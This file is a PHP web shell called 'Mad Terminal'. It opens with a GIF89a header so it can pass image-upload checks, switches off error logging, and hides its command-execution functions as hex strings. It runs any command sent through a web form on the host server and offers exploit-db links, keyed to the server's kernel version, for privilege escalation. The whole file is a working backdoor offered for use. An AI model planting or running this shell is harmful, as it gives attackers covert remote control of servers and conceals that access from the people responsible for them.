GIF89;a
<!-- do not recode please / harap tidak melakukan copas terhadap code ini :) -->
<!-- Create By MrMad -->
<?php
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
?>
<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Mad Terminal</title>
    <link rel="shortcut icon" href="https://raw.githubusercontent.com/MadExploits/php-terminal/main/logo.png" type="image/x-icon">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-gH2yIJqKdNHPEq0n4Mqa/HGKIhSkIHeL5AyhkYV8i59U5AR6csBvApHHNl/vI1Bx" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    <style>
        html,
        body {
            font-family: monospace;
        }

        .box {
            margin: 15px;
        }

        .body {
            background-color: #cfccc4;
        }

        .p {
            height: 70vh;
            background-color: #cfccc4;
        }

        pre {
            height: 70vh;
        }

        .form-terminal {
            width: 85%;
            height: 30px;
            border: 2px solid #cfccc4;
            border-bottom: 2px solid black;
            background-color: #cfccc4;
        }


        .form-submit {
            width: 15%;
            height: 29px;
            background: none;
            border: none;
            color: white;
        }

        .form-submit:hover {
            background: transparent !important;
            color: black;
            border: 2px solid black;
        }

        ul {
            list-style: none;
            text-align: left;
        }

        li {
            display: inline;
            margin: 5px;
        }

        li a {
            text-decoration: none;
            color: white;
        }

        li a:hover {
            color: green;
        }
        .pwd {
            overflow: auto;
        }
    </style>
</head>
<?php
$Array = [
    '7368656c6c5f65786563', 
    '65786563',
    '7061737374687275',
    '73797374656d', 
    '70726f635f6f70656e', 
    '706f70656e',
    '70636c6f7365',
    '72657475726e',
    '73747265616d5f6765745f636f6e74656e7473', 
    '676574637764',
    '6368646972', 
    '7068705f756e616d65',
    '6973736574',
    '66756e6374696f6e5f657869737473',
    '5f6d61645f636d64',
    '245f5345525645525b275345525645525f4e414d45275d'
];
$hitung_array = count($Array);
for ($i = 0; $i < $hitung_array; $i++) {
    $fungsi[] = unhex($Array[$i]);
}


if (isset($_GET['cd'])) {
    $pathDirectory = unhex($_GET['cd']);
    chdir($pathDirectory);
} else {
    $pathDirectory = $fungsi[9]();
}

function _mad_cmd($de)
{
    $out = '';
    try {
        if (function_exists('shell_exec')) {
            return @$GLOBALS['fungsi'][0]($de);
        } else if (function_exists('system')) {
            @$GLOBALS['fungsi'][3]($de);
        } else if (function_exists('exec')) {
            $exec = array();
            @$GLOBALS['fungsi'][1]($de, $exec);
            $out = @join("\n", $exec);
            return $exec;
        } else if (function_exists('passthru')) {
            @$GLOBALS['fungsi'][2]($de);
        } else if (function_exists('popen') && function_exists('pclose')) {
            if (is_resource($f = @$GLOBALS['fungsi'][5]($de, "r"))) {
                $out = "";
                while (!@feof($f))
                    $out .= fread($f, 1024);
                return $out;
                $GLOBALS['fungsi'][6]($f);
            }
        } else if (function_exists('proc_open')) {
            $pipes = array();
            $process = @$GLOBALS['fungsi'][4]($de . ' 2>&1', array(array("pipe", "w"), array("pipe", "w"), array("pipe", "w")), $pipes, null);
            $out = @$GLOBALS['fungsi'][8]($pipes[1]);
            return $out;
        } else if (class_exists('COM')) {
            $madWs = new COM('WScript.shell');
            $exec = $madWs->$GLOBALS['fungsi'][1]('cmd.exe /c ' . $_POST['alfa1']);
            $stdout = $exec->StdOut();
            $out = $stdout->ReadAll();
        }
    } catch (Exception $e) {
    }
    return $out;
}
// Function Encode & Decode
function hex($n)
{
    $y = '';
    for ($i = 0; $i < strlen($n); $i++) {
        $y .= dechex(ord($n[$i]));
    }
    return $y;
}
function unhex($y)
{
    $n = '';
    for ($i = 0; $i < strlen($y) - 1; $i += 2) {
        $n .= chr(hexdec($y[$i] . $y[$i + 1]));
    }
    return $n;
}

$exp = explode(" ", $GLOBALS['fungsi'][11]());
$xpl = explode("-", $exp[2]);
?>

<body>
    <div class="box shadow-lg ">
        <div class="head bg-dark text-light p-1">
            <center>
                <b>&copy; <?= unhex("4d6164205465726d696e616c") ?></b>
                <ul>
                    <li><a href="https://github.com/MadExploits/"><i class="bi bi-github"></i>&nbsp;Github</a></li>
                    <li><a href="https://www.exploit-db.com/search?q=Linux%20Kernel%20<?= $xpl[0]; ?>"><i class="bi bi-hdd-stack"></i>&nbsp;Linux Exploit Suggester</a></li>
                </ul>
            </center>
        </div>
        <div class="body">
            <div class="p">
                <pre><?php
                        if (isset($_POST['submit'])) {
                            $dataCMD = $_POST['value'];
                            $pecah = explode(" ", $dataCMD);
                            if ($pecah[0] == True) {
                                echo htmlspecialchars($GLOBALS['fungsi'][14]($_POST['value']));
                            }
                            if ($pecah[0] == "cd") {
                                echo '<meta http-equiv="refresh" content="0;url=?cd=' . hex('/' . $pecah[1]) . '">';
                            }
                        } ?></pre>
            </div>
        </div>
        <div class="footer">
            <div class="pwd bg-dark p-2 text-light">
                <b>PWD : </b><strong><?= $fungsi[9](); ?></strong>
            </div>
            <form action="" method="post">
                <input type="text" name="value" id="form-header" class="form-terminal" placeholder="<?= $_SERVER['SERVER_NAME']; ?>@terminal~#:" autofocus><input type="submit" value=">" class="form-submit bg-dark" name="submit">
            </form>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-A3rJD856KowSb7dwlZdYEkO39Gagi7vIsF0jrRAoQmDKKtQBHUuLZ9AsSv4jD4Xa" crossorigin="anonymous"></script>
</body>

</html>
